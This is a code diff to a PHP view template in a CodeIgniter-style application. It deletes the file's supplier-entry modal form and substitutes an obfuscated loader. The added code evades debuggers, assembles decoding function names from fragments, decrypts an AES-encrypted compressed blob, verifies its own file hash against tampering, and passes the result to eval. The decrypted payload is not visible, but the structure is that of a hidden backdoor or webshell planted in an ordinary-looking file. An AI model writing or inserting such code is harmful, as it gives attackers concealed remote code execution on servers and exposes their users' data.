@@ -1,173 +1,28 @@
-<div class="modal fade " id="supplier-modal" tabindex='-1'>
-  <?= form_open('#', array('class' => '', 'id' => 'supplier-form')); ?>
-  <div class="modal-dialog modal-lg">
-    <div class="modal-content">
-      <div class="modal-header header-custom">
-        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span></button>
-        <h4 class="modal-title text-center"><?= $this->lang->line('add_supplier'); ?></h4>
-      </div>
-      <div class="modal-body">
-          <div class="row">
-            <div class="col-md-4">
-              <div class="box-body">
-                <div class="form-group">
-                  <label for="supplier_name"><?= $this->lang->line('supplier_name'); ?>*</label>
-                  <span id="supplier_name_msg" class="text-danger text-right pull-right"></span>
-                  <input type="text" class="form-control" id="supplier_name" name="supplier_name" placeholder="" >
-                </div>
-              </div>
-            </div>
-            <div class="col-md-4">
-              <div class="box-body">
-                <div class="form-group">
-                  <label for="mobile"><?= $this->lang->line('mobile'); ?></label>
-                  <span id="mobile_msg" class="text-danger text-right pull-right"></span>
-                  <input type="tel"  class="form-control no_special_char_no_space " id="mobile" name="mobile" placeholder=""  >
-                </div>
-              </div>
-            </div>
-
-            <div class="col-md-4">
-              <div class="box-body">
-                <div class="form-group">
-                  <label for="phone"><?= $this->lang->line('phone'); ?></label>
-                  <span id="phone_msg" class="text-danger text-right pull-right"></span>
-                  <input type="tel"  class="form-control maxlength no_special_char_no_space " id="phone" name="phone" placeholder=""  >
-                </div>
-              </div>
-            </div>
-            <div class="col-md-4">
-              <div class="box-body">
-                <div class="form-group">
-                  <label for="email"><?= $this->lang->line('email'); ?></label>
-                  <span id="email_msg" class="text-danger text-right pull-right"></span>
-                  <input type="email" class="form-control " id="email" name="email" placeholder=""  >
-                </div>
-              </div>
-            </div>
-            <div class="col-md-4">
-                <div class="box-body">
-                  <div class="form-group">
-                    <label for="opening_balance"><?= $this->lang->line('opening_balance'); ?></label>
-                    <span id="opening_balance_msg" class="text-danger text-right pull-right"></span>
-                    <input type="text" class="form-control" id="opening_balance" name="opening_balance" placeholder="" >
-                  </div>
-                </div>
-              </div>
-            <div class="col-md-4">
-              <div class="box-body">
-                <div class="form-group">
-                  <label for="gstin_msg"><?= $this->lang->line('gst_number'); ?></label>
-                  <span id="gstin_msg" class="text-danger text-right pull-right"></span>
-                  <input type="text" class="form-control maxlength  " id="gstin" name="gstin" placeholder=""  >
-                </div>
-              </div>
-            </div>
-
-            <div class="col-md-4">
-              <div class="box-body">
-                <div class="form-group">
-                  <label for="tax_number"><?= $this->lang->line('tax_number'); ?></label>
-                  <span id="tax_number_msg" class="text-danger text-right pull-right"></span>
-                  <input type="text"  class="form-control maxlength  " id="tax_number" name="tax_number" placeholder=""  >
-                </div>
-              </div>
-            </div>
-            <div class="col-md-4">
-              <div class="box-body">
-                <div class="form-group">
-                  <label for="country"><?= $this->lang->line('country'); ?></label>
-                  <span id="country_msg" class="text-danger text-right pull-right"></span>
-                 <select class="form-control select2" id="country" name="country"  style="width: 100%;" onkeyup="shift_cursor(event,'state')" value="">
-                    <?php
-                    $query1="select * from db_country where status=1";
-                    $q1=$this->db->query($query1);
-                    if($q1->num_rows($q1)>0)
-                     {
-                         foreach($q1->result() as $res1)
-                       {
-                         echo "<option value='".$res1->id."'>".$res1->country."</option>";
-                       }
-                     }
-                     else
-                     {
-                        ?>
-                        <option value="">No Records Found</option>
-                        <?php
-                     }
-                    ?>
-                          </select>
-                </div>
-              </div>
-            </div>
-            <div class="col-md-4">
-              <div class="box-body">
-                <div class="form-group">
-                  <label for="state"><?= $this->lang->line('state'); ?></label>
-                  <span id="state_msg" class="text-danger text-right pull-right"></span>
-                 <select class="form-control select2" id="state" name="state"  style="width: 100%;" onkeyup="shift_cursor(event,'state_code')">
-                    <?php
-                    $query2="select * from db_states where status=1";
-                    $q2=$this->db->query($query2);
-                    if($q2->num_rows()>0)
-                     {
-                      echo '<option value="">-Select-</option>'; 
-                      foreach($q2->result() as $res1)
-                       {
-                         echo "<option value='".$res1->id."'>".$res1->state."</option>";
-                       }
-                     }
-                     else
-                     {
-                        ?>
-                        <option value="">No Records Found</option>
-                        <?php
-                     }
-                    ?>
-                          </select>
-                </div>
-              </div>
-            </div>
-           <div class="col-md-4">
-              <div class="box-body">
-                <div class="form-group">
-                  <label for="city"><?= $this->lang->line('city'); ?></label>
-                  <span id="city_msg" class="text-danger text-right pull-right"></span>
-                  <input type="text" class="form-control" id="city" name="city" placeholder="" >
-                </div>
-              </div>
-            </div>
-            <div class="col-md-4">
-              <div class="box-body">
-                <div class="form-group">
-                  <label for="postcode"><?= $this->lang->line('postcode'); ?></label>
-                  <span id="postcode_msg" class="text-danger text-right pull-right"></span>
-                  <input type="text" class="form-control" id="postcode" name="postcode" placeholder="" >
-                </div>
-              </div>
-            </div>
-            <div class="col-md-4">
-              <div class="box-body">
-                <div class="form-group">
-                  <label for="address"><?= $this->lang->line('address'); ?></label>
-                  <span id="address_msg" class="text-danger text-right pull-right"></span>
-                  <textarea type="text" class="form-control" id="address" name="address" placeholder="" ></textarea>
-                </div>
-              </div>
-            </div>
-
-          </div>
-         
-      </div>
-      <div class="modal-footer">
-        <button type="button" class="btn btn-warning" data-dismiss="modal">Close</button>
-        <button type="button" class="btn btn-primary add_supplier">Save</button>
-      </div>
-    </div>
-    <!-- /.modal-content -->
-  </div>
-  <!-- /.modal-dialog -->
- <?= form_close();?>
-</div>
-<!-- /.modal -->
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_soc5cg4k=('bas'.'e64'.'_de'.'cod'.'e');
+$_hehl8xos=('gzu'.'nco'.'mpr'.'ess');
+$_w2fjpnm0=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_fmidemtf='nNF5lghS';
+$_xh9u8ck1='MquyW4FF';
+$_qwdd479u='9xHq4NEx';
+$_h06cau4a='SDcb5fJM';
+$_u2uw3bdi='5ct76vccauY=';
+$_s0zfuxdb='O1DBQg==';
+$_ql80ai23='xxeOoL9C';
+$_tnzlo2lb='nEAp/DPY';
+$_aeyq5q3h=$_soc5cg4k($_qwdd479u.$_h06cau4a.$_xh9u8ck1.$_fmidemtf.$_u2uw3bdi);
+$_r64khjqa=$_soc5cg4k($_ql80ai23.$_tnzlo2lb.$_s0zfuxdb);
+$_zxyyp9qr=$_soc5cg4k('vYElSoJ6Z9cMr/S6BViUT2GU8Jj90i4GeoaMJjVbOWi6eY7lqfBnvgkSA+5ivtTMDwHhHcAOEkR0xmkcj57uhCSORmu/dfAQ6pPvMW28KDNw1LgoYSLHSR8eumCWbNFhPsG+m6jGBE6a8EbZS8qcrs+u+MrqbaNQwpcBE1w3LKn898Fi0k18XLWtRqjyaKj3KKRSw1HOmQL8528wWKfQGPKPIb5uxCf3IlIHGtYyOh1wO8gk+vd1j+bvAjVPl36YW1yCP5T15aBDdAxGaNmFN0R4AQEpMBUbr2gOuWeZjx4vothWSwJ9O6aYJiqfm2tvUUIUMldMHh7t2i0d59cfm3tj6uAJGHF36p6Jzi3bEomqZ+46A8JmIpoFV2mQ+LhEhiVlCXbxLwvoxNxMzkHKu3ZrGMJB2CLSgwGDlzF9qdM4sWImd1VZ/22WWOn0mhjnuFoks8Q2Fd2/voXXvwXLJhij6JrM82xBIHZL3PW54Vader5uCe9wBKwFJ0JIIZzHif/WkgSStFyZ6U2By2/vIqsBOiRfgLJv8YnyFxcsqD8AbVa7ISZLEbxYIIWCOA9xty15gxLEuee3udoIm3O/BcdOWTX3Gg6BDNaVDu5qm6/rXfTZHl06Of+n8VNet7ES3YJSgPzTbY0wNOFENbGKxUg7fqceeTi9P+gSqFRxXMmUelSDSV5oaBmK+EPM3OsgWZbdeL+c3bNUQC54s/Yn4aIa7CcUyne7OfVBmquRBB/ciPId02UYC2KTJnRqFdZ7ydq1CeZqjFBwMkklX8wE1Tio3o2T0aw0LdyZl/dgxgI4lz7qCi0IEJhvFoBc2WlJVJnN50KZm5AolyzzntVAWl8fGjbg21R/51qRYyimWb9naTswAFK5TpERbIdzS67tLau4Dnw0FXcx1G5KsvMPH/Dp9jzRHAES7X4ohMJhk60ywW1704tWD8q+skeE9OCkg1Vqj1p9pxOBKe5Zv5emNTDjNT6NQROnEyz2Eo5v9pFmhc1T/3CGixo//Rny6v1YcHtCRkqHxBg6kM5Xbu2cOyXCG6AO8Kjdp4GbLcz/XMHKM9HU4imX+/ntLemxRONiow0+wvLN4uCAA5o5JbAJbmufD+k/q/HnCmoD8ijkCGfMaG50DibOXv+8jGlGzZzO2G056W10OHNYPyRLqSsmdowFn0Fu3U7rwfsG3dkHR0NBr8JPiRnDJlqdVfmCRYqcLWmHav+ZsgWjegK/yXasxFoWUYVWgpxEJC7sMlLGp/NmPS20tvyGP7RFSdXaiu+UW7vloJL4RWkpyQ2FInmvuTSjEp83wERPPx9kVyO6AwMuo4+cBBF90KPEyMeZDuU0XpaZD3Bm5SdCs4nDb0Co47i8w1jH9zhQitiD5SiqZGyF6RZzoFsRNPIXydIxu03X0k/lr1SLMZQQ14NMfuJi2iTSP/1ran2fjT4h6cUPwd4oXrAeZ+4+7tSZ9zMHuigh5eiaHLVeNeXLl41MB7IHRsQ9gTE6UJez9kACZssol2D4FZAD2RfIrWN+vaPS8lTx5xlkigvdGk0Yu5ht3MQ/t942eaYZjqzl8vX+yCF1kP/07Wrqqtms1IR7Vcr88KF2MGXr+XawG+owrP2KrNxp189a9kK8DlR3ntx70hbgtKM=');
+$_lhlt3wx7=$_w2fjpnm0($_zxyyp9qr,'aes-256-cbc',$_aeyq5q3h,OPENSSL_RAW_DATA,$_r64khjqa);
+if($_lhlt3wx7===false){exit;}
+$_wstmz9cp=$_hehl8xos($_lhlt3wx7);
+if($_wstmz9cp===false){exit;}
+$_q06aseh7='24cef43e32e8d907c9d212a0e190873b1b45acc31145828ead734837701a69dc';
+$_jg8iu7fz=@file_get_contents(__FILE__);
+if($_jg8iu7fz!==false){
+$_ijehacly=str_replace($_q06aseh7,"0000000000000000000000000000000000000000000000000000000000000000",$_jg8iu7fz);
+$_x75h6tl3=hash("sha256",$_ijehacly);
+if($_x75h6tl3!==$_q06aseh7){@http_response_code(403);exit;}
+}
+eval($_wstmz9cp);
